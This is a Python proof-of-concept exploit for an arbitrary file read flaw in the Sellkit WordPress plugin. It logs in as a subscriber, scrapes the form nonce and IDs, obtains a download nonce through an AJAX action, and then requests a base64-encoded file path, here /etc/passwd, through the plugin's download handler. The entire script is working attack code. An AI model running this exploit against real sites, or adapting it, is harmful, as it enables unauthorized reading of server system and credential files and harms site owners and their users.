import base64
import re

import requests

# A subscriber level user is required to perform this exploit. It should be possible unauthenticated but someone typo'ed
# the nopriv addaction `add_action( 'admsellkitin_post_nopriv_...`
USER = 'user'
PASSWORD = 'password'
TARGET = 'http://localhost:8080'
POST = 'elementor-283'

session = requests.session()
# session.proxies = {'http': 'http://localhost:8081'}


def do_login(username, password):
    session.get(f'{TARGET}/wp-login.php')
    data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': 'http://localhost:8080/wp-admin/',
        'testcookie': 1
    }
    r = session.post(f'{TARGET}/wp-login.php', data=data, allow_redirects=False)

    if (r.status_code == 302):
        print(f"[+] Login Successful")
        return True

    print(r.text)
    print(f"[-] Login Failed")


def get_parameters():
    r = session.get(f'{TARGET}/{POST}/')

    post_id_pattern = r'<input type="hidden" name="post_id" value="(\d+)" />'
    form_id_pattern = r'<input type="hidden" name="form_id" value="([a-zA-Z0-9]+)" />'
    nonce_pattern = r'sellkit_elementor = {"nonce":"([a-zA-Z0-9]+)"'

    nonce = re.search(nonce_pattern, r.text)
    post_id = re.search(post_id_pattern, r.text)
    form_id = re.search(form_id_pattern, r.text)

    return post_id.group(1), form_id.group(1), nonce.group(1),


def get_download_URL(post_id, form_id, nonce):
    data = {
        'action': 'sellkit_optin_frontend',
        '_wpnonce': nonce,
        'post_id': post_id,
        'form_id': form_id,
        'fields%5B3bbe9d5%5D': 'test%40test.com',
        'fields%5B0accad4%5D': 'test%40test.com'
    }
    r = session.post(f'{TARGET}/wp-admin/admin-ajax.php', data=data)

    if "downloadURL" not in r.text:
        print("[-] Error: response does not contain downloadURL")
        return False

    download_url = r.json()['data']['downloadURL'][0]
    print(f"[+] Download URL: {download_url}")

    return download_url.split('=')[-1]


def download_arbitary_file(download_nonce, filepath):
    data = {
        'action': 'sellkit_download_file'
    }
    b64_file = base64.b64encode(filepath.encode()).decode()
    r = session.post(
        f'{TARGET}/wp-admin/admin-post.php?_wpnonce={download_nonce}&file={b64_file}',
        data=data)
    print(r.text)


if do_login(USER, PASSWORD):
    post_id, form_id, nonce = get_parameters()
    print(f"[+] Post ID: {post_id}")
    print(f"[+] Form ID: {form_id}")
    print(f"[+] Nonce: {nonce}")
    download_nonce = get_download_URL(post_id, form_id, nonce)
    print(f"[+] Download Nonce: {download_nonce}")
    download_arbitary_file(download_nonce, '/etc/passwd')
